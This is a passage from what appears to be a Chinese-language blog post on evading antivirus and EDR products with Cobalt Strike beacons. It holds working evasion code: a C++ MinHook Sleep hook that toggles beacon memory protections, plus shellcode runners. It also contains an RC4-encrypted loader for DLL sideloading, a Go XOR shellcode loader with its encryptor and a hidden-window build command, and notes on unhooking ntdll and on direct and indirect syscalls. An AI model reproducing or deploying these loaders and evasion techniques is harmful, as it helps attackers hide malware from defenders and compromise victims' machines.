class=\"code\"><pre><span class=\"line\">#include &lt;Windows.h&gt;</span><br><span class=\"line\">#include &lt;MinHook.h&gt;</span><br><span class=\"line\">#include &lt;iostream&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">#if defined _M_X64</span><br><span class=\"line\">#pragma comment(lib, &quot;libMinHook-x64-v141-mt.lib&quot;)</span><br><span class=\"line\">#elif defined _M_IX86</span><br><span class=\"line\">#pragma comment(lib, &quot;libMinHook-x86-v141-mt.lib&quot;)</span><br><span class=\"line\">#endif</span><br><span class=\"line\"></span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F; 定义内存页属性结构体</span><br><span class=\"line\">struct MemoryAttrib &#123;</span><br><span class=\"line\">    LPVOID address;\t\t&#x2F;&#x2F; 内存地址</span><br><span class=\"line\">    DWORD size;\t\t\t&#x2F;&#x2F; 内存大小</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F; 定义内存信息结构体</span><br><span class=\"line\">struct MemoryInfo &#123;</span><br><span class=\"line\">    MemoryAttrib memoryPage[4];\t&#x2F;&#x2F; 能找到符合条件的目标内存最多3个</span><br><span class=\"line\">    int index &#x3D; 0;\t\t\t\t\t&#x2F;&#x2F; 内存下标</span><br><span class=\"line\">    unsigned char* key;\t\t&#x2F;&#x2F; 加解密key</span><br><span class=\"line\">    BOOL isScanMemory &#x3D; FALSE;\t\t\t&#x2F;&#x2F; 是否已查找内存页信息</span><br><span class=\"line\">    BOOL iscleaned &#x3D; FALSE;\t\t\t\t&#x2F;&#x2F;是否清除之前的beacon和shellcode遗留</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">MemoryInfo memoryInfo;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;*-------------------------misc func----------------------------------*&#x2F;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F; 删除 shellcode 和 加密beacon</span><br><span class=\"line\">void DeleteOther()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    MemoryAttrib shellcode &#x3D; memoryInfo.memoryPage[memoryInfo.index - 3];</span><br><span class=\"line\">    MemoryAttrib enc_beacon &#x3D; memoryInfo.memoryPage[memoryInfo.index - 2];</span><br><span class=\"line\">    printf(&quot;[+]shellcode Address at 0x%p\\n&quot;, shellcode.address);</span><br><span class=\"line\">    printf(&quot;[+]enc_beacon Address at 0x%p\\n&quot;, enc_beacon.address);</span><br><span class=\"line\">    &#x2F;&#x2F; 0填充</span><br><span class=\"line\">    RtlSecureZeroMemory(shellcode.address, shellcode.size);</span><br><span class=\"line\">    RtlSecureZeroMemory(enc_beacon.address, enc_beacon.size);</span><br><span class=\"line\">    DWORD oldProt;</span><br><span class=\"line\">    &#x2F;&#x2F;修改属性</span><br><span class=\"line\">    VirtualProtect(shellcode.address, shellcode.size, PAGE_READWRITE, &amp;oldProt);</span><br><span class=\"line\">    VirtualProtect(enc_beacon.address, enc_beacon.size, PAGE_READWRITE, &amp;oldProt);</span><br><span class=\"line\">    memoryInfo.iscleaned &#x3D; TRUE;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F; 扫描内存中带有X属性的内存并标记</span><br><span class=\"line\">void ScanMemoryMap()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    &#x2F;&#x2F; 内存块信息结构体</span><br><span class=\"line\">    MEMORY_BASIC_INFORMATION mbi;</span><br><span class=\"line\"></span><br><span class=\"line\">    LPVOID lpAddress &#x3D; 0;</span><br><span class=\"line\">    HANDLE hProcess &#x3D; OpenProcess(MAXIMUM_ALLOWED, FALSE, GetCurrentProcessId());</span><br><span class=\"line\">    int* index &#x3D; &amp;memoryInfo.index;</span><br><span class=\"line\"></span><br><span class=\"line\">    while (VirtualQueryEx(hProcess, lpAddress, &amp;mbi, sizeof(mbi)))</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        &#x2F;&#x2F; 查找 RWX &#x2F; X &#x2F;RX</span><br><span class=\"line\">        if (mbi.Protect &#x3D;&#x3D; PAGE_EXECUTE_READWRITE || mbi.Protect &#x3D;&#x3D; PAGE_EXECUTE || mbi.Protect &#x3D;&#x3D; PAGE_EXECUTE_READ &amp;&amp; mbi.Type &#x3D;&#x3D; MEM_PRIVATE)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            &#x2F;&#x2F; 保存内存信息</span><br><span class=\"line\">            memoryInfo.memoryPage[*index].address &#x3D; mbi.BaseAddress;</span><br><span class=\"line\">            memoryInfo.memoryPage[*index].size &#x3D; (DWORD)mbi.RegionSize;</span><br><span class=\"line\">            printf(&quot;[%d]扫描到地址: 0x%p\\n&quot;, *index, memoryInfo.memoryPage[*index].address);</span><br><span class=\"line\">            (*index)++;</span><br><span class=\"line\"></span><br><span class=\"line\">            if ((*index) &gt;&#x3D; 4)</span><br><span class=\"line\">                break;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        &#x2F;&#x2F; 更新到下一个内存页</span><br><span class=\"line\">        lpAddress &#x3D; (LPVOID)((DWORD_PTR)mbi.BaseAddress + mbi.RegionSize);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    memoryInfo.isScanMemory &#x3D; TRUE;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;*-------------------------define hook func----------------------------------*&#x2F;</span><br><span class=\"line\">void (WINAPI* OldSleep)(DWORD dwMiliseconds);</span><br><span class=\"line\"></span><br><span class=\"line\">void (WINAPI MyHookedSleep)(DWORD dwMiliseconds);</span><br><span class=\"line\"></span><br><span class=\"line\">template &lt;typename T&gt;</span><br><span class=\"line\">inline MH_STATUS MH_CreateHookApiEx(</span><br><span class=\"line\">    LPCWSTR pszModule, LPCSTR pszProcName, LPVOID pDetour, T** ppOriginal)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    return MH_CreateHookApi(</span><br><span class=\"line\">        pszModule, pszProcName, pDetour, reinterpret_cast&lt;LPVOID*&gt;(ppOriginal));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">BOOL Hook()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    if (MH_Initialize() !&#x3D; MH_OK) &#123; return false; &#125;</span><br><span class=\"line\">    &#x2F;&#x2F;Sleep</span><br><span class=\"line\">    if (MH_CreateHookApiEx(L&quot;kernel32&quot;, &quot;Sleep&quot;, &amp;MyHookedSleep, &amp;OldSleep) !&#x3D; MH_OK) &#123; return false; &#125;</span><br><span class=\"line\">    if (MH_EnableHook(MH_ALL_HOOKS) !&#x3D; MH_OK) &#123; return false; &#125;</span><br><span class=\"line\">    return true;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;*-------------------------my hook func--------------------------------*&#x2F;</span><br><span class=\"line\">void WINAPI MyHookedSleep(DWORD dwMiliseconds)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    DWORD oldProt;</span><br><span class=\"line\">    if (!memoryInfo.isScanMemory) &#123;</span><br><span class=\"line\">        ScanMemoryMap();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    if (!memoryInfo.iscleaned) &#123;</span><br><span class=\"line\">        DeleteOther();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    DWORD time &#x3D; dwMiliseconds;</span><br><span class=\"line\">    if (time &gt; 1000) &#123;</span><br><span class=\"line\">        MemoryAttrib beacon &#x3D; memoryInfo.memoryPage[memoryInfo.index - 1];</span><br><span class=\"line\">        &#x2F;&#x2F;DoSuspendThreads(GetCurrentProcessId(), GetCurrentThreadId());</span><br><span class=\"line\">        printf(&quot;[+]修改beacon属性为RW: address 0x%p\\n&quot;, beacon.address);</span><br><span class=\"line\">        VirtualProtect(beacon.address, beacon.size, PAGE_READWRITE, &amp;oldProt);</span><br><span class=\"line\">        &#x2F;&#x2F;HeapEncryptDecrypt();</span><br><span class=\"line\"></span><br><span class=\"line\">        OldSleep(dwMiliseconds);</span><br><span class=\"line\">        printf(&quot;[+]修改beacon属性为RX: address 0x%p\\n&quot;, beacon.address);</span><br><span class=\"line\">        VirtualProtect(beacon.address, beacon.size, PAGE_EXECUTE_READ, &amp;oldProt);</span><br><span class=\"line\">        &#x2F;&#x2F;HeapEncryptDecrypt();</span><br><span class=\"line\">        &#x2F;&#x2F;DoResumeThreads(GetCurrentProcessId(), GetCurrentThreadId());</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    else &#123;</span><br><span class=\"line\">        OldSleep(time);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;*-------------------------main--------------------------------*&#x2F;</span><br><span class=\"line\"></span><br><span class=\"line\">int main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    if (!Hook()) &#123;return 1; &#125;</span><br><span class=\"line\">    unsigned char buf[] &#x3D; &quot;\\xfc\\xe8\\x89\\x00\\x00\\x00&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">    const size_t length &#x3D; sizeof(buf);</span><br><span class=\"line\">    void* shellcode &#x3D; VirtualAlloc(NULL, length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class=\"line\">    memcpy(shellcode, buf, length);</span><br><span class=\"line\">    ((void(*)(void)) shellcode)();</span><br><span class=\"line\"></span><br><span class=\"line\">    return 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>效果图：sleep时，beacon属性为RW</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240515153954755.png\" alt=\"image-20240515153954755\"></p>\n<p>没有sleep时，属性为RW+RX三部分</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240515154122799.png\" alt=\"image-20240515154122799\"></p>\n<p>Ref：<a href=\"https://github.com/mgeeky/ShellcodeFluctuation\">ShellcodeFluctuation</a>、<a href=\"https://xz.aliyun.com/t/12701?time__1311=mqmhDvox8GOD/D0lD2DUh4fhBFeM2rwD\">Cobalt Strike与YARA：我能拥有你的签名吗？</a>、<a href=\"https://mp.weixin.qq.com/s?__biz=MzkxMTMxMjI2OQ==&mid=2247484016&idx=1&sn=c788a9a63f3db2f2e7a11f3c82534281&chksm=c11f5692f668df84677a4fe2bff5ea3104f9e349533d0e70815c246edf89c53cd27922cdef43&scene=178&cur_album_id=2280727834220429320#rd\">Beacon sleep_mask 分析</a>、<a href=\"https://www.cobaltstrike.com/blog/cobalt-strike-4-4-the-one-with-the-reconnect-button\">Cobalt Strike 4.4: The One with the Reconnect Button</a>、<a href=\"https://bbs.kanxue.com/thread-274676.htm\">CobaltStrike检测与对抗</a>、<a href=\"https://www.arashparsa.com/catching-a-malware-with-no-name/\">Analyzing Malware with Hooks, Stomps, and Return-addresses</a>、<a href=\"https://oxis.github.io/GPUSleep/\">GPUSleep. Makes your beacon disappear into GPU memory</a></p>\n<h2 id=\"栈欺骗\"><a href=\"#栈欺骗\" class=\"headerlink\" title=\"栈欺骗\"></a>栈欺骗</h2><p>能力之外：</p>\n<p><a href=\"https://mp.weixin.qq.com/s?__biz=Mzk0NTUwNzAyOA==&mid=2247483991&idx=1&sn=726883083a2ae0c4c33359a1c58324fb&chksm=c3151decf46294faabbcb33c6ebc78f083ec1a40500afabfedf67c8fe65687b38007846b5db1&scene=126&sessionid=1698330378&key=98b23746bc43506087e78253d823e63912c74cdda7d97957c104dbfde02ef56562289ae43f8f1071a4eae6991081caa559ba450eba5d6675fc1e4465dda302207ea7811c47c64e4ed1ce6bbc7ecc08ca27aa2ea2f67552c9aaab108b9e262a7bc13ce7c24ecde47c4ff97300532c7900c9661d7aeda707754882640febb30991&ascene=15&uin=MzgxODQ4MjMz&devicetype=Windows+10+x64&version=63060012&lang=zh_CN&session_us=gh_183ba3e9a2da&countrycode=GY&exportkey=n_ChQIAhIQd3qUEWSakepdJdInpn+HPRLvAQIE97dBBAEAAAAAAAEAFgxiFOsAAAAOpnltbLcz9gKNyK89dVj0aGYW1jtewsyXFFBTLHMdxvcZfewW8vHrEIattaVm0UTj0AIlGlbxX2RWBGo/rB7uauz9/4qnReipfVTgrmwvV2VBid9d8GtC/7TnNenqy9j2GhB0RSgzxsjAnY0GelrpfTymDg+C9f1afYsEy6Nllaef/ioEnBRzk8JJBKLPEnJM1j5MwuoLcHQo2Wnjt379MPM2r7FEQqqciTK3cR2kpbcWikH2PcwXsDis1FDvwg2mkMMDIJIeM8W8X5mL3ItCcAAOzFnDfvV5&acctmode=0&pass_ticket=7M9Jv6ZxglLxMB7GtRyi4WlVHFCf3labClIm+0tqJ4xzN2VRO8/dUPM0tpg5TJWZ&wx_header=0&fontgear=2\">调用栈欺骗技术</a></p>\n<p><a href=\"https://xz.aliyun.com/t/14487?time__1311=mqmx9QD=Dt0QO405DIYYK0=Fi=L6Kkdh7bD\">初探堆栈欺骗之静态欺骗</a></p>\n<h2 id=\"工具\"><a href=\"#工具\" class=\"headerlink\" title=\"工具\"></a>工具</h2><p><a href=\"https://github.com/kyleavery/AceLdr\">kyleavery/AceLdr: Cobalt Strike UDRL for memory scanner evasion</a>  涵盖以上所有bypass。</p>\n<h1 id=\"行为对抗免杀\"><a href=\"#行为对抗免杀\" class=\"headerlink\" title=\"行为对抗免杀\"></a>行为对抗免杀</h1><p>杀软目前都有主动防御，对恶意行为进行拦截提示，比如这些行为：</p>\n<ul>\n<li><p>注册表操作、添加启动项、添加服务</p>\n</li>\n<li><p>文件写入、读系统文件、删除文件、移动文件</p>\n</li>\n<li><p>杀进程、创建进程、加载dll</p>\n</li>\n<li><p>注入、劫持等</p>\n</li>\n</ul>\n<p>如下几种bypass</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">1. 替换API</span><br><span class=\"line\">使用相同功能的API进行替换，由于杀软只会针对一部分API进行拦截，对于API不能做到面面俱到的拦截，比如未导出API和底层API，所以这种方法还是有效的。</span><br><span class=\"line\"></span><br><span class=\"line\">2. 重写API</span><br><span class=\"line\">完全重写系统的API功能，实现自己的对应功能API，对ring3的行为拦截非常有效。</span><br><span class=\"line\"></span><br><span class=\"line\">3. 合理更改调用顺序</span><br><span class=\"line\">有时被拦截的行为是通过多个API组合来完成的，所以合理替换顺序，绕过杀软的拦截策略，也可以绕过行为拦截</span><br><span class=\"line\"></span><br><span class=\"line\">4. 绕过调用源</span><br><span class=\"line\">直接调用0环API。</span><br></pre></td></tr></table></figure>\n\n<p>关于行为对抗，我建议借鉴学习该项目：<a href=\"https://github.com/yanghaoi/CobaltStrike_CNA\">CobaltStrike_CNA</a>，在cs上使用 <code>net user admin /delete</code> 就会被拦截，看一下该项目是怎么绕过的：</p>\n<p>通过使用cs的反射dll技术，调用 reflective_dll.dll</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240516145945893.png\" alt=\"image-20240516145945893\"></p>\n<p>调用的是 <code>NetUserAdd</code> API，比较常见的api了</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240516150042665.png\" alt=\"image-20240516150042665\"></p>\n<p>[利用ReflectiveDLL来武装你的Cobalt Strike](<a href=\"https://uknowsec.cn/posts/notes/%E5%88%A9%E7%94%A8ReflectiveDLL%E6%9D%A5%E6%AD%A6%E8%A3%85%E4%BD%A0%E7%9A%84Cobalt\">https://uknowsec.cn/posts/notes/利用ReflectiveDLL来武装你的Cobalt</a> Strike.html)</p>\n<p><a href=\"https://www.anquanke.com/post/id/264890\">一些绕过AV进行UserAdd的方法总结及实现</a></p>\n<h1 id=\"unhook-API\"><a href=\"#unhook-API\" class=\"headerlink\" title=\"unhook API\"></a>unhook API</h1><p>目的就是获取纯净的 ntdll 以避免 API 函数被hook。</p>\n<p>四种方式：</p>\n<ul>\n<li>磁盘重载 ntdll</li>\n<li>PE 文件映射</li>\n<li>挂起的进程获取干净的ntdll</li>\n<li>自定义直接跳转</li>\n</ul>\n<p><a href=\"https://www.cnblogs.com/fdxsec/p/18146252\">几种unhook手法的学习 - fdx_xdf</a></p>\n<p><a href=\"https://killer.wtf/2022/01/19/CustomJmpUnhook.html\">自定义跳转函数的unhook方法</a></p>\n<p><a href=\"https://blog.csdn.net/xf555er/article/details/132439629\">Hook免杀实战: 去除杀软的三环钩子_unhook 免杀</a></p>\n<p><a href=\"https://xz.aliyun.com/t/9493?time__1311=n4+xuDgD9ALxBGDlxGrbDyiDclDnjhZlDYT+D\">bypass Bitdefender</a></p>\n<p><a href=\"https://shells.systems/defeat-bitdefender-total-security-using-windows-api-unhooking-to-perform-process-injection/\">Defeat Bitdefender total security using windows API unhooking to perform process injection - Shells.Systems</a></p>\n<p>项目：</p>\n<p><a href=\"https://github.com/fdx-xdf/LdrLoadDll-Unhooking-x86-x64/blob/main/unhook.cpp\">LdrLoadDll-Unhooking-x86-x64/unhook.cpp at main · fdx-xdf/LdrLoadDll-Unhooking-x86-x64</a></p>\n<p><a href=\"https://github.com/dosxuz/PerunsFart\">PerunsFart: This is my own implementation of the Perun’s Fart technique by Sektor7</a></p>\n<p><a href=\"https://github.com/optiv/Freeze\">/Freeze: Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods</a></p>\n<h1 id=\"SYSCALL\"><a href=\"#SYSCALL\" class=\"headerlink\" title=\"SYSCALL\"></a>SYSCALL</h1><p>简单来说就是跳过api函数调用，直接通过SSN号，利用syscall，直接在内核操作，避免使用API函数。具体原理细节讲不懂。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240516214827068.png\" alt=\"image-20240516214827068\"></p>\n<p>总结：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">首先，为了防止 api 被 hook，提出了 syscall 函数，这产生了地狱之门的项目，然而，当 ntdll 被 hook 时，这种方法就失效了，因此出现了更高级的技术，如“光环之门”，试图通过邻居来获取系统调用号（SSN）。然而，即使获取了 SSN，仍然有可能被安全软件检测到，因为系统调用的签名（sysall）可能会被查杀。为了解决这个问题，出现了“egg_hunter”等技术。但是堆栈的问题还没有解决，我们需要合法的堆栈， SysWhispers2 和 SysWhispers3，它们提出了间接系统调用的方案，进一步提高了对系统调用的隐藏性和逃避性，使得安全工具更难检测到和拦截这些调用</span><br></pre></td></tr></table></figure>\n\n<p>Ref：</p>\n<p><a href=\"http://www.qfrost.com/posts/windowskernel/windows%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_2/\">Windows系统调用学习笔记（2）3环进0环</a></p>\n<p><a href=\"https://idiotc4t.com/defense-evasion/overwrite-winapi-bypassav\">通过重写ring3 API函数实现免杀</a></p>\n<p><a href=\"https://www.cnblogs.com/fdxsec/p/18029158\">Syscall笔记 - fdx_xdf</a></p>\n<p><a href=\"https://ryze-t.com/2021/12/01/%E6%B5%85%E8%B0%88-Syscall/\">浅谈 Windows Syscall</a></p>\n<p><a href=\"https://www.cnblogs.com/zpchcbd/p/15961380.html\">API函数的调用过程(三环到零环)以及重写WriteProcessMemory三环</a></p>\n<p><a href=\"https://bbs.kanxue.com/thread-279538.htm\">SysWhispers3学习</a></p>\n<p>项目：</p>\n<p><a href=\"https://github.com/klezVirus/SysWhispers3\">SysWhispers3: SysWhispers on Steroids - AV/EDR evasion via direct system calls</a></p>\n<h1 id=\"白加黑\"><a href=\"#白加黑\" class=\"headerlink\" title=\"白加黑\"></a>白加黑</h1><p>之前写过一篇关于dll劫持的白加黑：<a href=\"http://www.y0ng.top/2023/12/25/DLL%E5%8A%AB%E6%8C%81/\">初探DLL劫持</a>，再推个项目吧：</p>\n<p><a href=\"https://github.com/Neo-Maoku/SearchAvailableExe\">SearchAvailableExe: 寻找可利用的白文件</a></p>\n<p><a href=\"https://github.com/Neo-Maoku/DllMainHijacking\">https://github.com/Neo-Maoku/DllMainHijacking</a></p>\n<p>报错的话转发处理下就行了。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">void runShellcode() &#123;</span><br><span class=\"line\">    string data &#x3D; &quot;37bcc518419......&quot;;  &#x2F;&#x2F; rc4加密</span><br><span class=\"line\"></span><br><span class=\"line\">    const size_t length &#x3D; data.size() &#x2F; 2;</span><br><span class=\"line\">    unsigned char* buf &#x3D; (unsigned char*)malloc(length);</span><br><span class=\"line\">    &#x2F;&#x2F; 调用函数将十六进制字符串转换为字节型数组</span><br><span class=\"line\">    ToBytes(data, buf, length);</span><br><span class=\"line\">    unsigned char key[] &#x3D; &quot;key is here&quot;;</span><br><span class=\"line\">    enc_dec(key, buf);</span><br><span class=\"line\">    LPVOID shellcode &#x3D; VirtualAlloc(NULL, length, MEM_COMMIT | MEM_RESERVE, 0x40);</span><br><span class=\"line\"></span><br><span class=\"line\">    memcpy(shellcode, buf, length);</span><br><span class=\"line\"></span><br><span class=\"line\">    void(*func)();</span><br><span class=\"line\">    func &#x3D; (void(*)())shellcode;</span><br><span class=\"line\">    func();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240517122818922.png\" alt=\"image-20240517122818922\"></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240517143734080.png\" alt=\"image-20240517143734080\"></p>\n<p>Ref：<a href=\"https://saucer-man.com/information_security/1171.html\">https://saucer-man.com/information_security/1171.html</a></p>\n<h1 id=\"堆栈溢出\"><a href=\"#堆栈溢出\" class=\"headerlink\" title=\"堆栈溢出\"></a>堆栈溢出</h1><p><a href=\"https://xz.aliyun.com/t/14405?time__1311=mqmx9QD=0=0Q5GNDQiiQL3AKgRD0O7BRiD&alichlgref=https://xz.aliyun.com/u/83539#toc-0\">无Windows API的新型恶意程序：自缺陷程序利用堆栈溢出的隐匿稳定攻击技术研究</a></p>\n<p>是个思路，但是有dll的话不如用白加黑。</p>\n<h1 id=\"临时免杀\"><a href=\"#临时免杀\" class=\"headerlink\" title=\"临时免杀\"></a>临时免杀</h1><h2 id=\"golang-syscall\"><a href=\"#golang-syscall\" class=\"headerlink\" title=\"golang syscall\"></a>golang syscall</h2><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">package main</span><br><span class=\"line\"></span><br><span class=\"line\">import (</span><br><span class=\"line\">\t&quot;syscall&quot;</span><br><span class=\"line\">\t&quot;unsafe&quot;</span><br><span class=\"line\">)</span><br><span class=\"line\"></span><br><span class=\"line\">func main() &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#x2F;&#x2F; shellcode is here</span><br><span class=\"line\">\tdata :&#x3D; []byte&#123;0x56, 0xe2,......&#125;</span><br><span class=\"line\">\tkey :&#x3D; byte(0xAA)</span><br><span class=\"line\"></span><br><span class=\"line\">\t &#x2F;&#x2F; 解密shellcode</span><br><span class=\"line\">\tfor i :&#x3D; 0; i &lt; len(data); i++ &#123;</span><br><span class=\"line\">\t\tdata[i] ^&#x3D; key</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t&#x2F;&#x2F; 加载动态链接库</span><br><span class=\"line\">\tkernel32, err :&#x3D; syscall.LoadLibrary(&quot;kernel32.dll&quot;)</span><br><span class=\"line\">\tif err !&#x3D; nil &#123;</span><br><span class=\"line\">\t\treturn</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tdefer syscall.FreeLibrary(kernel32)</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#x2F;&#x2F; 获取 VirtualAlloc 函数地址</span><br><span class=\"line\">\tvirtualAlloc, err :&#x3D; syscall.GetProcAddress(kernel32, &quot;VirtualAlloc&quot;)</span><br><span class=\"line\">\tif err !&#x3D; nil &#123;</span><br><span class=\"line\">\t\treturn</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#x2F;&#x2F; 获取 RtlMoveMemory 函数地址</span><br><span class=\"line\">\tntdll, err :&#x3D; syscall.LoadLibrary(&quot;ntdll.dll&quot;)</span><br><span class=\"line\">\tif err !&#x3D; nil &#123;</span><br><span class=\"line\">\t\treturn</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tdefer syscall.FreeLibrary(ntdll)</span><br><span class=\"line\"></span><br><span class=\"line\">\trtlMoveMemory, err :&#x3D; syscall.GetProcAddress(ntdll, &quot;RtlMoveMemory&quot;)</span><br><span class=\"line\">\tif err !&#x3D; nil &#123;</span><br><span class=\"line\">\t\treturn</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#x2F;&#x2F; 调用 VirtualAlloc 分配内存</span><br><span class=\"line\">\tmem, _, err :&#x3D; syscall.Syscall6(uintptr(virtualAlloc), 4,</span><br><span class=\"line\">\t\t0,               &#x2F;&#x2F; lpAddress (0 for system to determine)</span><br><span class=\"line\">\t\tuintptr(4096),   &#x2F;&#x2F; dwSize (size of allocation)</span><br><span class=\"line\">\t\tuintptr(0x1000), &#x2F;&#x2F; flAllocationType (commit reserved pages)</span><br><span class=\"line\">\t\tuintptr(0x40),   &#x2F;&#x2F; flProtect (PAGE_EXECUTE_READWRITE)</span><br><span class=\"line\">\t\t0, 0)</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#x2F;&#x2F; 执行shellcode</span><br><span class=\"line\">\t_, _, err &#x3D; syscall.Syscall6(uintptr(rtlMoveMemory), 3,</span><br><span class=\"line\">\t\tmem,                               &#x2F;&#x2F; Destination</span><br><span class=\"line\">\t\tuintptr(unsafe.Pointer(&amp;data[0])), &#x2F;&#x2F; Source</span><br><span class=\"line\">\t\tuintptr(len(data)),                &#x2F;&#x2F; Length</span><br><span class=\"line\">\t\t0, 0, 0)</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tsyscall.Syscall(mem, 0, 0, 0, 0)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>enc.go</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">package main</span><br><span class=\"line\"></span><br><span class=\"line\">import (</span><br><span class=\"line\">\t&quot;encoding&#x2F;hex&quot;</span><br><span class=\"line\">\t&quot;fmt&quot;</span><br><span class=\"line\">\t&quot;strings&quot;</span><br><span class=\"line\">)</span><br><span class=\"line\"></span><br><span class=\"line\">func main() &#123;</span><br><span class=\"line\">\t&#x2F;&#x2F; 要加密的数据</span><br><span class=\"line\">\tdataHex :&#x3D; &#96;shellcode is here&#96;</span><br><span class=\"line\"></span><br><span class=\"line\">\tdataHex &#x3D; strings.ReplaceAll(dataHex, &quot;\\t&quot;, &quot;&quot;)</span><br><span class=\"line\">\tdataHex &#x3D; strings.ReplaceAll(dataHex, &quot;\\n&quot;, &quot;&quot;)</span><br><span class=\"line\">\tdataHex &#x3D; strings.ReplaceAll(dataHex, &quot;\\\\x&quot;, &quot;&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#x2F;&#x2F; 解析十六进制字符串为字节切片</span><br><span class=\"line\">\tdata, err :&#x3D; hex.DecodeString(dataHex)</span><br><span class=\"line\">\tif err !&#x3D; nil &#123;</span><br><span class=\"line\">\t\tfmt.Println(&quot;解析十六进制字符串失败:&quot;, err)</span><br><span class=\"line\">\t\treturn</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#x2F;&#x2F; 加密密钥</span><br><span class=\"line\">\tkey :&#x3D; byte(0xAA)</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#x2F;&#x2F; 加密数据</span><br><span class=\"line\">\tfor i :&#x3D; 0; i &lt; len(data); i++ &#123;</span><br><span class=\"line\">\t\tdata[i] ^&#x3D; key</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#x2F;&#x2F; 将加密后的内容按 \\x 格式输出</span><br><span class=\"line\">\tencryptedString :&#x3D; &quot;&quot;</span><br><span class=\"line\">\tfor _, b :&#x3D; range data &#123;</span><br><span class=\"line\">\t\tencryptedString +&#x3D; fmt.Sprintf(&quot;\\\\x%02x&quot;, b)</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tfmt.Println(&quot;加密后的内容：&quot;, encryptedString)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>编译：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">go build -ldflags &quot;-H windowsgui&quot; main.go</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"c-rc4\"><a href=\"#c-rc4\" class=\"headerlink\" title=\"c++ rc4\"></a>c++ rc4</h2><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#include &lt;Windows.h&gt;</span><br><span class=\"line\">#include &lt;string&gt;</span><br><span class=\"line\">#include &lt;fstream&gt;</span><br><span class=\"line\">#include &lt;iostream&gt;</span><br><span class=\"line\">#include &quot;lazy_importer.hpp&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\">#pragma comment(linker,&quot;&#x2F;subsystem:\\&quot;windows\\&quot; &#x2F;entry:\\&quot;mainCRTStartup\\&quot;&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">#define size_b 256</span><br><span class=\"line\">unsigned char 